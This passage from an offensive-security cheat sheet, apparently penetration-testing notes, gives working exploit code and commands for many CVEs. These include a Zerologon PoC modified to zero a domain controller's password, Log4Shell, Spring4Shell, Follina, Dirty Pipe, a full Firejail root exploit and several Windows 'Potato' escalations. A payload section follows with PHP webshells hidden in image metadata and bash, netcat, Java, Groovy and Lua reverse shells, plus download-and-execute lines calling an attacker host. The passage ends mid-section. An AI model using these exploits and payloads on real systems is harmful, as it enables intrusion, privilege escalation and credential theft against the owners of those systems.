<h5>Prerequisites</h5>
<pre><code class="language-c">python3 -m pip install virtualenv
python3 -m virtualenv venv
source venv/bin/activate
pip install git+https://github.com/SecureAuthCorp/impacket
</code></pre>
<h5>PoC Modification</h5>
<pre><code class="language-c">    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
</code></pre>
<h5>Weaponized PoC</h5>
<pre><code class="language-c">#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
  flags = 0x212fffff

  # Send challenge and authentication request.
  nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )

    
    # It worked!
    assert server_auth['ErrorCode'] == 0
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
    
    if not rpc_con:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)


if __name__ == '__main__':
  if not (3 &lt;= len(sys.argv) &lt;= 4):
    print('Usage: zerologon_tester.py &lt;dc-name&gt; &lt;dc-ip&gt;\n')
    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    [_, dc_name, dc_ip] = sys.argv

    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)
</code></pre>
<h5>Execution</h5>
<pre><code class="language-c">python3 zerologon_tester.py &lt;HANDLE&gt; &lt;RHOST&gt;
impacket-secretsdump -just-dc -no-pass &lt;HANDLE&gt;\$@&lt;RHOST&gt;
</code></pre>
<h4>CVE-2021-3156: Sudo / sudoedit LPE</h4>
<blockquote>
<p>https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435</p>
</blockquote>
<h5>Pre-requisistes</h5>
<ul>
<li>Ubuntu 20.04 (Sudo 1.8.31)</li>
<li>Debian 10 (Sudo 1.8.27)</li>
<li>Fedora 33 (Sudo 1.9.2)</li>
<li>All legacy versions &gt;= 1.8.2 to 1.8.31p2 and all stable versions &gt;= 1.9.0 to 1.9.5p1</li>
</ul>
<h5>Vulnerability Test</h5>
<pre><code class="language-c">sudoedit -s /
</code></pre>
<p>The machine is vulnerable if one of the following message is shown.</p>
<pre><code class="language-c">sudoedit: /: not a regular file
segfault
</code></pre>
<p>Not vulnerable if the error message starts with <code>usage:</code>.</p>
<h4>CVE-2021-44228: Log4Shell RCE (0-day)</h4>
<blockquote>
<p>https://github.com/kozmer/log4j-shell-poc</p>
</blockquote>
<h5>Pre-requisistes</h5>
<blockquote>
<p>https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</p>
</blockquote>
<pre><code class="language-c">tar -xvf jdk-8u20-linux-x64.tar.gz
</code></pre>
<h5>Start the Listener</h5>
<pre><code class="language-c">python poc.py --userip &lt;LHOST&gt; --webport &lt;RPORT&gt; --lport &lt;LPORT&gt;                                   
</code></pre>
<h5>Execution</h5>
<pre><code class="language-c">${jndi:ldap://&lt;LHOST&gt;:1389/foobar}
</code></pre>
<h4>CVE-2022-0847: Dirty Pipe LPE</h4>
<pre><code class="language-c">gcc -o dirtypipe dirtypipe.c
./dirtypipe /etc/passwd 1 ootz:
su rootz
</code></pre>
<h4>CVE-2022-22963: Spring4Shell RCE (0-day)</h4>
<blockquote>
<p>https://github.com/me2nuk/CVE-2022-22963</p>
</blockquote>
<pre><code class="language-c">curl -X POST http://&lt;RHOST&gt;/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;curl &lt;LHOST&gt;/&lt;FILE&gt;.sh -o /dev/shm/&lt;FILE&gt;&quot;)' --data-raw 'data' -v
</code></pre>
<pre><code class="language-c">curl -X POST http://&lt;RHOST&gt;/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;bash /dev/shm/&lt;FILE&gt;&quot;)' --data-raw 'data' -v
</code></pre>
<h4>CVE-2022-30190: MS-MSDT Follina RCE</h4>
<blockquote>
<p>https://github.com/JohnHammond/msdt-follina</p>
</blockquote>
<pre><code class="language-c">python3 follina.py -p 80 -c 'powershell.exe Invoke-WebRequest http://&lt;LHOST&gt;:8000/nc64.exe -OutFile C:\\Windows\\Tasks\\nc64.exe; C:\\Windows\\Tasks\\nc64.exe -e cmd.exe &lt;LHOST&gt; &lt;LPORT&gt;'
</code></pre>
<pre><code class="language-c">python3 -m http.server 8000
</code></pre>
<pre><code class="language-c">nc -lnvp &lt;LPORT&gt;
</code></pre>
<pre><code class="language-c">swaks --to &lt;EMAIL&gt; --from &lt;EMAIL&gt; --server &lt;RHOST&gt; --body &quot;http://&lt;LHOST&gt;/&quot;
</code></pre>
<h4>CVE-2022-31214: Firejail LPE</h4>
<blockquote>
<p>https://seclists.org/oss-sec/2022/q2/188</p>
</blockquote>
<blockquote>
<p>https://www.openwall.com/lists/oss-security/2022/06/08/10</p>
</blockquote>
<pre><code class="language-c">#!/usr/bin/python3

# Author: Matthias Gerstner &lt;matthias.gerstner () suse com&gt;
#
# Proof of concept local root exploit for a vulnerability in Firejail 0.9.68
# in joining Firejail instances.
#
# Prerequisites:
# - the firejail setuid-root binary needs to be installed and accessible to the
#   invoking user
#
# Exploit: The exploit tricks the Firejail setuid-root program to join a fake
# Firejail instance. By using tmpfs mounts and symlinks in the unprivileged
# user namespace of the fake Firejail instance the result will be a shell that
# lives in an attacker controller mount namespace while the user namespace is
# still the initial user namespace and the nonewprivs setting is unset,
# allowing to escalate privileges via su or sudo.

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Print error message and exit with status 1
def printe(*args, **kwargs):
    kwargs['file'] = sys.stderr
    print(*args, **kwargs)
    sys.exit(1)

# Return a boolean whether the given file path fulfils the requirements for the
# exploit to succeed:
# - owned by uid 0
# - size of 1 byte
# - the content is a single '1' ASCII character
def checkFile(f):
    s = os.stat(f)

    if s.st_uid != 0 or s.st_size != 1 or not stat.S_ISREG(s.st_mode):
        return False

    with open(f) as fd:
        ch = fd.read(2)

        if len(ch) != 1 or ch != &quot;1&quot;:
            return False

    return True

def mountTmpFS(loc):
    subprocess.check_call(&quot;mount -t tmpfs none&quot;.split() + [loc])

def bindMount(src, dst):
    subprocess.check_call(&quot;mount --bind&quot;.split() + [src, dst])

def checkSelfExecutable():
    s = os.stat(__file__)

    if (s.st_mode &amp; stat.S_IXUSR) == 0:
        printe(f&quot;{__file__} needs to have the execute bit set for the exploit to work. Run `chmod +x {__file__}` and try again.&quot;)

# This creates a &quot;helper&quot; sandbox that serves the purpose of making available
# a proper &quot;join&quot; file for symlinking to as part of the exploit later on.
#
# Returns a tuple of (proc, join_file), where proc is the running subprocess
# (it needs to continue running until the exploit happened) and join_file is
# the path to the join file to use for the exploit.
def createHelperSandbox():
    # just run a long sleep command in an unsecured sandbox
    proc = subprocess.Popen(
            &quot;firejail --noprofile -- sleep 10d&quot;.split(),
            stderr=subprocess.PIPE)

    # read out the child PID from the stderr output of firejail
    while True:
        line = proc.stderr.readline()
        if not line:
            raise Exception(&quot;helper sandbox creation failed&quot;)

        # on stderr a line of the form &quot;Parent pid &lt;ppid&gt;, child pid &lt;pid&gt;&quot; is output
        line = line.decode('utf8').strip().lower()
        if line.find(&quot;child pid&quot;) == -1:
            continue

        child_pid = line.split()[-1]

        try:
            child_pid = int(child_pid)
            break
        except Exception:
            raise Exception(&quot;failed to determine child pid from helper sandbox&quot;)

    # We need to find the child process of the child PID, this is the
    # actual sleep process that has an accessible root filesystem in /proc
    children = f&quot;/proc/{child_pid}/task/{child_pid}/children&quot;

    # If we are too quick then the child does not exist yet, so sleep a bit
    for _ in range(10):
        with open(children) as cfd:
            line = cfd.read().strip()
            kids = line.split()
            if not kids:
                time.sleep(0.5)
                continue
            elif len(kids) != 1:
                raise Exception(f&quot;failed to determine sleep child PID from helper sandbox: {kids}&quot;)

            try:
                sleep_pid = int(kids[0])
                break
            except Exception:
                raise Exception(&quot;failed to determine sleep child PID from helper sandbox&quot;)
    else:
        raise Exception(f&quot;sleep child process did not come into existence in {children}&quot;)

    join_file = f&quot;/proc/{sleep_pid}/root/run/firejail/mnt/join&quot;
    if not os.path.exists(join_file):
        raise Exception(f&quot;join file from helper sandbox unexpectedly not found at {join_file}&quot;)

    return proc, join_file

# Re-executes the current script with unshared user and mount namespaces
def reexecUnshared(join_file):

    if not checkFile(join_file):
        printe(f&quot;{join_file}: this file does not match the requirements (owner uid 0, size 1 byte, content '1')&quot;)

    os.environ[&quot;FIREJOIN_JOINFILE&quot;] = join_file
    os.environ[&quot;FIREJOIN_UNSHARED&quot;] = &quot;1&quot;

    unshare = shutil.which(&quot;unshare&quot;)
    if not unshare:
        printe(&quot;could not find 'unshare' program&quot;)

    cmdline = &quot;unshare -U -r -m&quot;.split()
    cmdline += [__file__]

    # Re-execute this script with unshared user and mount namespaces
    subprocess.call(cmdline)

if &quot;FIREJOIN_UNSHARED&quot; not in os.environ:
    # First stage of execution, we first need to fork off a helper sandbox and
    # an exploit environment
    checkSelfExecutable()
    helper_proc, join_file = createHelperSandbox()
    reexecUnshared(join_file)

    helper_proc.kill()
    helper_proc.wait()
    sys.exit(0)
else:
    # We are in the sandbox environment, the suitable join file has been
    # forwarded from the first stage via the environment
    join_file = os.environ[&quot;FIREJOIN_JOINFILE&quot;]

# We will make /proc/1/ns/user point to this via a symlink
time_ns_src = &quot;/proc/self/ns/time&quot;

# Make the firejail state directory writeable, we need to place a symlink to
# the fake join state file there
mountTmpFS(&quot;/run/firejail&quot;)
# Mount a tmpfs over the proc state directory of the init process, to place a
# symlink to a fake &quot;user&quot; ns there that firejail thinks it is joining
try:
    mountTmpFS(&quot;/proc/1&quot;)
except subprocess.CalledProcessError:
    # This is a special case for Fedora Linux where SELinux rules prevent us
    # from mounting a tmpfs over proc directories.
    # We can still circumvent this by mounting a tmpfs over all of /proc, but
    # we need to bind-mount a copy of our own time namespace first that we can
    # symlink to.
    with open(&quot;/tmp/time&quot;, 'w') as _:
        pass
    time_ns_src = &quot;/tmp/time&quot;
    bindMount(&quot;/proc/self/ns/time&quot;, time_ns_src)
    mountTmpFS(&quot;/proc&quot;)

FJ_MNT_ROOT = Path(&quot;/run/firejail/mnt&quot;)

# Create necessary intermediate directories
os.makedirs(FJ_MNT_ROOT)
os.makedirs(&quot;/proc/1/ns&quot;)

# Firejail expects to find the umask for the &quot;container&quot; here, else it fails
with open(FJ_MNT_ROOT / &quot;umask&quot;, 'w') as umask_fd:
    umask_fd.write(&quot;022&quot;)

# Create the symlink to the join file to pass Firejail's sanity check
os.symlink(join_file, FJ_MNT_ROOT / &quot;join&quot;)
# Since we cannot join our own user namespace again fake a user namespace that
# is actually a symlink to our own time namespace. This works since Firejail
# calls setns() without the nstype parameter.
os.symlink(time_ns_src, &quot;/proc/1/ns/user&quot;)

# The process joining our fake sandbox will still have normal user privileges,
# but it will be a member of the mount namespace under the control of *this*
# script while *still* being a member of the initial user namespace.
# 'no_new_privs' won't be set since Firejail takes over the settings of the
# target process.
#
# This means we can invoke setuid-root binaries as usual but they will operate
# in a mount namespace under our control. To exploit this we need to adjust
# file system content in a way that a setuid-root binary grants us full
# root privileges. 'su' and 'sudo' are the most typical candidates for it.
#
# The tools are hardened a bit these days and reject certain files if not owned
# by root e.g. /etc/sudoers. There are various directions that could be taken,
# this one works pretty well though: Simply replacing the PAM configuration
# with one that will always grant access.
with tempfile.NamedTemporaryFile('w') as tf:
    tf.write(&quot;auth sufficient pam_permit.so\n&quot;)
    tf.write(&quot;account sufficient pam_unix.so\n&quot;)
    tf.write(&quot;session sufficient pam_unix.so\n&quot;)

    # Be agnostic about the PAM config file location in /etc or /usr/etc
    for pamd in (&quot;/etc/pam.d&quot;, &quot;/usr/etc/pam.d&quot;):
        if not os.path.isdir(pamd):
            continue
        for service in (&quot;su&quot;, &quot;sudo&quot;):
            service = Path(pamd) / service
            if not service.exists():
                continue
            # Bind mount over new &quot;helpful&quot; PAM config over the original
            bindMount(tf.name, service)

print(f&quot;You can now run 'firejail --join={os.getpid()}' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.&quot;)

while True:
    line = sys.stdin.readline()
    if not line:
        break
</code></pre>
<h4>First Terminal</h4>
<pre><code class="language-c">./firejoin_py.bin
You can now run 'firejail --join=193982' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
</code></pre>
<h4>Second Terminal</h4>
<pre><code class="language-c">firejail --join=193982
su
</code></pre>
<h4>CVE-2023-21746: Windows NTLM EoP LocalPotato LPE</h4>
<blockquote>
<p>https://github.com/decoder-it/LocalPotato</p>
</blockquote>
<blockquote>
<p>https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc</p>
</blockquote>
<p>Modify the following file and build the solution.</p>
<pre><code class="language-c">StorSvc\RpcClient\RpcClient\storsvc_c.c
</code></pre>
<pre><code class="language-c">#if defined(_M_AMD64)

//#define WIN10
//#define WIN11
#define WIN2019
//#define WIN2022
</code></pre>
<p>Modify the following file and build the solution.</p>
<pre><code class="language-c">StorSvc\SprintCSP\SprintCSP\main.c
</code></pre>
<pre><code class="language-c">void DoStuff() {

    // Replace all this code by your payload
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(L&quot;c:\\windows\\system32\\cmd.exe&quot;,L&quot; /C net localgroup administrators user /add&quot;,
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L&quot;C:\\Windows&quot;, &amp;si, &amp;pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}
</code></pre>
<p>First get the <code>paths</code> from the <code>environment</code>, then use <code>LocalPotato</code> to place the <code>malicious DLL</code>.</p>
<pre><code class="language-c">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&quot; -v Path
LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
</code></pre>
<p>At least trigger <code>StorSvc</code> via <code>RpcClient.exe</code>.</p>
<pre><code class="language-c">.\RpcClient.exe
</code></pre>
<h4>CVE-2023-22809: Sudo Bypass</h4>
<blockquote>
<p>https://medium.com/@dev.nest/how-to-bypass-sudo-exploit-cve-2023-22809-vulnerability-296ef10a1466</p>
</blockquote>
<h5>Prerequisites</h5>
<ul>
<li>Sudo version needs to be ≥ 1.8 and &lt; 1.9.12p2.</li>
<li>Limited Sudo access to at least one file on the system that requires root access.</li>
</ul>
<h5>Example</h5>
<pre><code class="language-c">test ALL=(ALL:ALL) NOPASSWD: sudoedit /etc/motd
</code></pre>
<h5>Exploitation</h5>
<pre><code class="language-c">EDITOR=&quot;vi -- /etc/passwd&quot; sudoedit /etc/motd
</code></pre>
<pre><code class="language-c">sudoedit /etc/motd
</code></pre>
<h4>CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)</h4>
<pre><code class="language-c">Import-Module .\CVE-2023-23397.ps1
Send-CalendarNTLMLeak -recipient &quot;&lt;EMAIL&gt;&quot; -remotefilepath &quot;\\&lt;LHOST&gt;\&lt;FILE&gt;.wav&quot; -meetingsubject &quot;&lt;SUBJECT&gt;&quot; -meetingbody &quot;&lt;TEXT&gt;&quot;
</code></pre>
<h4>CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)</h4>
<ul>
<li>Linux ubuntu2204 5.19.0-46-generic</li>
</ul>
<pre><code class="language-c">unshare -rm sh -c &quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot; &amp;&amp; u/python3 -c 'import os;os.setuid(0);os.system(&quot;id&quot;)'
</code></pre>
<h4>CVE-2023-4911: Looney Tunables LPE</h4>
<pre><code class="language-c">python3 gen_libc.py 
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<pre><code class="language-c">gcc -o exp exp.c
./exp
</code></pre>
<h4>GodPotato LPE</h4>
<blockquote>
<p>https://github.com/BeichenDream/GodPotato</p>
</blockquote>
<pre><code class="language-c">.\GodPotato-NET4.exe -cmd '&lt;COMMAND&gt;'
</code></pre>
<h4>Juicy Potato LPE</h4>
<blockquote>
<p>https://github.com/ohpe/juicy-potato</p>
</blockquote>
<blockquote>
<p>http://ohpe.it/juicy-potato/CLSID/</p>
</blockquote>
<h5>GetCLSID.ps1</h5>
<pre><code class="language-c">&lt;#
This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION
Then exports to CSV
#&gt;

$ErrorActionPreference = &quot;Stop&quot;

New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT

Write-Output &quot;Looking for CLSIDs&quot;
$CLSID = @()
Foreach($ID in (Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}})){
    if ($ID.appid -ne $null){
        $CLSID += $ID
    }
}

Write-Output &quot;Looking for APIDs&quot;
$APPID = @()
Foreach($AID in (Get-ItemProperty HKCR:\appid\* | select-object localservice,@{N='AppID'; E={$_.pschildname}})){
    if ($AID.LocalService -ne $null){
        $APPID += $AID
    }
}

Write-Output &quot;Joining CLSIDs and APIDs&quot;
$RESULT = @()
Foreach ($app in $APPID){
    Foreach ($CLS in $CLSID){
        if($CLS.AppId -eq $app.AppID){
            $RESULT += New-Object psobject -Property @{
                AppId    = $app.AppId
                LocalService = $app.LocalService
                CLSID = $CLS.CLSID
            }

            break
        }
    }
}

$RESULT = $RESULT | Sort-Object LocalService

# Preparing to Output
$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace &quot;Microsoft &quot;, &quot;&quot;
$TARGET = $OS -Replace &quot; &quot;,&quot;_&quot;

# Make target folder
New-Item -ItemType Directory -Force -Path .\$TARGET

# Output in a CSV
$RESULT | Export-Csv -Path &quot;.\$TARGET\CLSIDs.csv&quot; -Encoding ascii -NoTypeInformation

# Export CLSIDs list
$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath &quot;.\$TARGET\CLSID.list&quot; -Encoding ascii

# Visual Table
$RESULT | ogv
</code></pre>
<h5>Execution</h5>
<pre><code class="language-c">.\JuicyPotato.exe -l 1337 -c &quot;{4991d34b-80a1-4291-83b6-3328366b9097}&quot; -p C:\Windows\system32\cmd.exe -a &quot;/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/&lt;FILE&gt;.ps1')&quot; -t *
</code></pre>
<h4>JuicyPotatoNG LPE</h4>
<blockquote>
<p>https://github.com/antonioCoco/JuicyPotatoNG</p>
</blockquote>
<pre><code class="language-c">.\JuicyPotatoNG.exe -t * -p &quot;C:\Windows\system32\cmd.exe&quot; -a &quot;/c whoami&quot;
</code></pre>
<h4>MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE</h4>
<blockquote>
<p>https://www.exploit-db.com/exploits/1518</p>
</blockquote>
<pre><code class="language-c">gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
</code></pre>
<pre><code class="language-c">mysql -u root
</code></pre>
<pre><code class="language-c">&gt; use mysql;
&gt; create table foo(line blob);
&gt; insert into foo values(load_file('/PATH/TO/SHARED_OBJECT/raptor_udf2.so'));
&gt; select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
&gt; create function do_system returns integer soname 'raptor_udf2.so';
&gt; select do_system('chmod +s /bin/bash');
</code></pre>
<h4>PrintSpoofer LPE</h4>
<blockquote>
<p>https://github.com/itm4n/PrintSpoofer</p>
</blockquote>
<pre><code class="language-c">.\PrintSpoofer64.exe -i -c powershell
</code></pre>
<h4>SharpEfsPotato LPE</h4>
<blockquote>
<p>https://github.com/bugch3ck/SharpEfsPotato</p>
</blockquote>
<pre><code class="language-c">SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a &quot;C:\nc64.exe -e cmd.exe &lt;LHOST&gt; &lt;LPORT&gt;&quot;
</code></pre>
<h4>Shocker Container Escape</h4>
<blockquote>
<p>https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c</p>
</blockquote>
<h5>Modifying Exploit</h5>
<pre><code class="language-c">        // get a FS reference from something mounted in from outside
        if ((fd1 = open(&quot;/etc/hostname&quot;, O_RDONLY)) &lt; 0)
                die(&quot;[-] open&quot;);

        if (find_handle(fd1, &quot;/root/root.txt&quot;, &amp;root_h, &amp;h) &lt;= 0)
                die(&quot;[-] Cannot find valid handle!&quot;);
</code></pre>
<h5>Compiling</h5>
<pre><code class="language-c">gcc shocker.c -o shocker
cc -Wall -std=c99 -O2 shocker.c -static
</code></pre>
<h3>Payloads</h3>
<h4>Donut</h4>
<pre><code class="language-c">donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
</code></pre>
<h4>Exiftool</h4>
<h5>PHP into JPG Injection</h5>
<pre><code class="language-c">exiftool -Comment='&lt;?php passthru(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;LHOST&gt; &lt;LPORT&gt; &gt;/tmp/f&quot;); ?&gt;' shell.jpg
exiv2 -c'A &quot;&lt;?php system($_REQUEST['cmd']);?&gt;&quot;!' &lt;FILE&gt;.jpeg
exiftool &quot;-comment&lt;=back.php&quot; back.png
exiftool -Comment='&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET['cmd']); ?&gt;' &lt;FILE&gt;.png
</code></pre>
<h4>GhostScript</h4>
<pre><code class="language-c">%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag &gt; /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
</code></pre>
<h4>nishang</h4>
<pre><code class="language-c">cd path/to/nishang/Shells/
cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1

tail -3 Invoke-PowerShellTcp.ps1
}

Invoke-PowerShellTcp -Reverse -IPAddress &lt;LHOST&gt; -Port &lt;LPORT&gt;

powershell &quot;IEX(New-Object Net.Webclient).downloadString('http://&lt;LHOST&gt;:&lt;LPORT&gt;/Invoke-PowerShellTcp.ps1')&quot;
</code></pre>
<h4>Reverse Shells</h4>
<h5>Bash Reverse Shell</h5>
<pre><code class="language-c">bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1
bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1'
echo -n '/bin/bash -c &quot;bin/bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&quot;' | base64
</code></pre>
<h5>curl Reverse Shell</h5>
<pre><code class="language-c">curl --header &quot;Content-Type: application/json&quot; --request POST http://&lt;RHOST&gt;:&lt;RPORT&gt;/upload --data '{&quot;auth&quot;: {&quot;name&quot;: &quot;&lt;USERNAME&gt;&quot;, &quot;password&quot;: &quot;&lt;PASSWORD&gt;&quot;}, &quot;filename&quot; : &quot;&amp; echo &quot;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&quot;|base64 -d|bash&quot;}'
</code></pre>
<h5>Groovy (Jenkins) Reverse Shell</h5>
<pre><code class="language-c">String host=&quot;&lt;LHOST&gt;&quot;;
int port=&lt;LPORT&gt;;
String cmd=&quot;/bin/bash&quot;;
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
</code></pre>
<h5>JAVA Reverse Shell</h5>
<pre><code class="language-c">r = Runtime.getRuntime()
p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt;;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
p.waitFor()

r = Runtime.getRuntime(); p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt;;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]); p.waitFor();
</code></pre>
<h6>shell.jar</h6>
<pre><code class="language-c">package &lt;NAME&gt;;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class Main extends JavaPlugin {
   @Override
   public void onDisable() {
     super.onDisable();
   }

@Override
public void onEnable() {
  final String PHP_CODE = &quot;&lt;?php system($_GET['cmd']); ?&gt;&quot;;
  try {
   Files.write(Paths.get(&quot;/var/www/&lt;RHOST&gt;/shell.php&quot;), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);
   } catch (IOException e) {
     e.printStackTrace();
   }

   super.onEnable();
  }
}
</code></pre>
<h5>Lua Reverse Shell</h5>
<pre><code class="language-c">http://&lt;RHOST&gt;');os.execute(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;LHOST&gt; &lt;LPORT&gt;/tmp/f&quot;)--
</code></pre>
<h5>Markdown Reverse Shell</h5>
<pre><code class="language-c">--';bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1;'--
</code></pre>
<h5>mkfifo Reverse Shell</h5>
<pre><code class="language-c">mkfifo /tmp/shell; nc &lt;LHOST&gt; &lt;LPORT&gt; 0&lt;/tmp/shell | /bin/sh &gt;/tmp/shell 2&gt;&amp;1; rm /tmp/shell
</code></pre>
<h5>Netcat Reverse Shell</h5>
<pre><code class="language-c">nc -e /bin/sh &lt;LHOST&gt; &lt;LPORT&gt;
</code></pre>
<h5>Perl Reverse Shell</h5>
